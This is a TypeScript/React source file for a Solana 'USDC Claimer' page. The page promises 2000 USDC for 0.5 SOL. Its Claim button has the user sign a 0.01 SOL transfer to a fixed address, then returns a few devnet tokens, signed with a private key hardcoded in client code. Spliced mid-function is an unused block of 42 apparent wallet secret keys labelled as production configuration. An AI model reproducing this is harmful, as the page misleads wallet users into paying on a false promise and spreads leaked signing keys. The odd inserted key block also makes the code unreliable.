/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "to7BYmfWtU3fQ9ffzPBxbS1MBaM3dsAeQTanvY47CFDiBqufydLRPxZJiqf3dSkX6xfNBT4Z1mbz2vanJmWCofh"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4RreGM5NTCXP8krYCSuAMi65Qhwp5ti13yUfvthTuRuNDgMvWamGb8zBvLRA5okL6Si8onpZX2uEVh1Vt8jiUUMZ",
  "key1": "4DeGKSTS38jD6RXrhxSzsjUen3YWs7D2m26cCKY5oWGYS5RfjgRuuwm5m9FfdYqU239ptk8tbaw317Bw1chPqhYq",
  "key2": "56y4wWi6XUFHJcqhQ3LU7eCXq48ygF6VHTU4UFh9ZsieMiHAvrA7ZBQndWJZiqBWDvscRKRyFfXfrBGHSrMGtzsm",
  "key3": "VYjkP5y8XN7SSMMRPng2PVGF9SESuhowXQsQWDG9ggC5LSRFBhMZ5Y5M73Z4LbEJzAx5aiM6WEbvz2iEZgQMAAf",
  "key4": "3t6EajVN6v1CfHLyNkxvtwTPEtxQS55cu5sKWWAC4x3ngYAvT4iGxUyNQcmadPTyuKwsTRoprvJp8DoVu9oHL1iX",
  "key5": "4x76ctYcpHwrMUqmYTR6aKi5MZEhgc7gU4gtxohhbB8gJLS6UKhmhs7HkxAwTYUQvK59D5pdwxoRghozSyucrnHf",
  "key6": "4XZCNoLkLEHBm6dXQYPV8kQXjsMay9Hopoj4KgB5sJnsC1LXhWHtKE29D8xeU2Egn7oUjAwL5xdKyrex5upa5tPq",
  "key7": "2U5d9EfGu2n9UfK5g1FbHvYkjqBjAX4XKQS6SQGNbr6MmF4htR29UV38ZECK2Qivk3kta6xsVM4oPreg4jaf5tD2",
  "key8": "5D28oqL9VEXe1xrbvL7Qj7yAAyQNZs3MttejZi4te9C9Hv7Nx9jzjQWuYc1V2xe1LZuKMWHTAMFGtPZ9EdYUBLMG",
  "key9": "2HqUA528fzZibCaitxvf1X5U2VitVohUgg8zFGqXcJTWXEWHh5wkb995MorPzzwphCVCE78Sa7EnSdEbiSpEpSB3",
  "key10": "UY4dcexnNsAwm4Y4dEhbR3boRnH5ipcoGbbXgTwWh2boxezsvuaWKV2V1M7pMaE4oqJCxfUuxxY3FCRXWtwhYcb",
  "key11": "Kret6q1FprNxp6sSpcR7egJpNQ4pz8bF7wucjHDixauoK1jiLECm5pgSJr5JanQeEbcZCxi7cAGebN9JkcnhY8K",
  "key12": "5BzS98w4GMnY2qSYK1ThPrwyTxrboSTV8yuiKfjnrkbQvHVaaJQKavYwe9dE8nMLHHkMrN62a9PtLRE9bK7W54iN",
  "key13": "4SCmqpw8XMpocvT3s4wyojQB1kjCcwT3siqSFbwPUtJ4JFwye584XRHA8tJTEimFzGYKLt311KGi1LCEyqiHCsGF",
  "key14": "D35scbJKEXXKQboUqG7VtC6rp5rEdiv57YhcoorMUWKbuox96cASg81ix1MDibYDJEAxhs7fLBRB6WQcf4qqRGn",
  "key15": "3rv9SoDteYshdL5KD5RRHdNVkJkKZnUf1PasADvXPYBEcLweST41DCLDNQXgDqeyHzts2BuxitogSxFNBFLXvvLn",
  "key16": "5sJHuD2sjWfV4ohGGH8rU2AwTAe9moeeeVB19Mv8yV9QrMLpCihTXVWVccfniHsG8BgoqE3PDVkaVqgzqq1jvGdd",
  "key17": "4xzT1xNDudF8xgk8QhSLreo1C2zcTrtuctgwrgX2293ivgGXK4pzpGzu2TMzyxgrchCir9GsU8Xf4aiZgxekPWec",
  "key18": "5AM418MQuo7BFPwULaPKAeXHFuUTrJ7vZYqUJCCdTrKh7FheTaCRL4CvvDnBtb2swqWamnAf6QpdQTkhAv7dz1mz",
  "key19": "3PLGz3aVU2bcCveErawxhtBDBXgbjPEA2vGTddVxWu4b5eNVv4hWxJoYdbE4Ecio7iRBD8kpFGmg51bmZ6UnZDuz",
  "key20": "3dNvUXau4zHSbyK82SB9JHr5CsXmXdxbowBTRd5ANbH1rKqswHnr1DmQQA8R5h3amzqKjNoKJmQD48uE6cB7ebp3",
  "key21": "2wzpaK3bkDzp8xWmerr8PpvtmTxyTzPXFcTfGN36TnGEvv2rDfL6YK3xA4ZujURqaU6ZC8frKazDviMeu8xiz5og",
  "key22": "56PfFJAws1E2VC5GB94QaMm8h8byjWCGZJPQbXz6WadEQazXEWbjQRB8H93auXTeXaHxW322xHN2kUJtazSCkB68",
  "key23": "271ZFYpcuerXX9FtnD5NMtzQ6pqwVbmPPwG8i9NQGwEosDUu6cg7v7HJMJzGJzsUMydoc3CdKK1CGY182cPYNouU",
  "key24": "3uW1qHn6n6zkQV9ChPwNj1Ks1tJQyuwgZ77koWaPvZJehMLPmbeYorPh1x936s8NCHP17nDni694vQVFNLKC28G8",
  "key25": "2euiuBCZdv2B3Qt7ocbsViULzMSqtmysijCFQbUAGR25mhKSGnayc1pJytnVZVABaDhbNPU2fAzE8edigVR6yJMp",
  "key26": "58EcZNsTXaQ6VKihUsZExNmSq86ssjQrhsMbjALeM6DRoL7CeLRzgLpBqxFVQMi62PrQqgzmyBHhwttLNoQ2fLs7",
  "key27": "U8VHz219tozUjcs6z42EBLWGsMkM4pg4cSAjeDGUmh5oy31TJ7yei1H27HSTGyDU2keiEUJwHram6FadXAxtyrk",
  "key28": "3Aif8M8M7ETRc5kE2dmXZhxdCXqiFXASykYBBNrBzDaFWrYA5tYsm5rpumcWXfHhjEG3qqYLRqeqLqsXhCyQhiLS",
  "key29": "2UnD7xA3FkwFHedCLCaqxaBUhmh1emVdtmUTEu16A3wTzfucZToStCz5XT7KBffsqA1oRgQryWcisHinYuDd523r",
  "key30": "4CaProYE7bMRb7VSMPoZq1i4xrs37n3hu6isSjv91t1fpijhzjKspzPTzDfA5ftTQ7QwZrPjPfhEJQoA14AcmrrQ",
  "key31": "2haxBYCuFCSSEALtWKBrHYdqb1npzQ5UoNbGSugxmw9aerAHXS2x7K1C1GbJ2aoauCzv3RN4LJji7hpkqPXX5XeX",
  "key32": "43YU5Kk6g6u2ArPygoEsz71N7UF5HAKYw8j28WXKUao6ci1QAb3LuBzqpQFYr5ewsDMY3RcQcWPZjBSq1Kb8ce8T",
  "key33": "24Rz6WzmoLt3bD84QxKX46FGY8uspciUJndBDPvQWBWPNK9h5pnhyRsjuVe9oRG1iBZghsoMEjhJDRCLKTwYNhkU",
  "key34": "42mpA4xPCaDczhi1wTA7qzvcxwUerHDmHaDpAaamF2gg9RaTEuiVFxozhRjcKi3uDTpmrNbGNfhp5pM6MdwMVGMh",
  "key35": "qaRuR8uEt2dM3ngMFPvU8Tm5cN385BUgL7iKzPL5casTVGaP4LTgvexEdmBf6tvr6WftDuqMQTXTuJUTAFNMJ52",
  "key36": "48BkKBHKwaiyUrMgYWTR92Wo2XwfttTjW4fnwRd5JvWxPAA2xy5VRfvL4rPCsPSdxnyeTRnRHPHPBhsUY2A7BoNP",
  "key37": "46vAZj17Yg15EzEB9wwTcmkZGaULG64Xpv1C7VtEdNtmzMAMRfbWLBYm3xW4Us1d5NW9EVJ5wy4uu7CZxQhoPono",
  "key38": "3mj3vTsgftyPyeb4MHx4C87EPqVPumsoBB89motFWEWoLUFQKBHPXdwqQimDZnVsM8m76LfxZvnkAFJcHdcaai1j",
  "key39": "2gPjBuMTDjU8RiDdfYqQbWELkeAhyL6xQD933yJbCAwUMnHk89PQPjbstHgpnhLeKo9AJKHj6qH3Uoj1RbC6AKM6",
  "key40": "3JXLKY2jQ9yGXpJWT1iEhmAwwkryBqHQCJPxfcisRDdbuxCyBLc2ViP4aZvQBQ7ozX8SWbDhWCUHXfY5w1dGdCcE",
  "key41": "onSmBi8wBjbtRfcFP8TLgHH4VT16W1NcMi2F9T33XGERQQZZWDivmdTNETcnEgT68Y3Juqqndcoukfak96af2pT"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
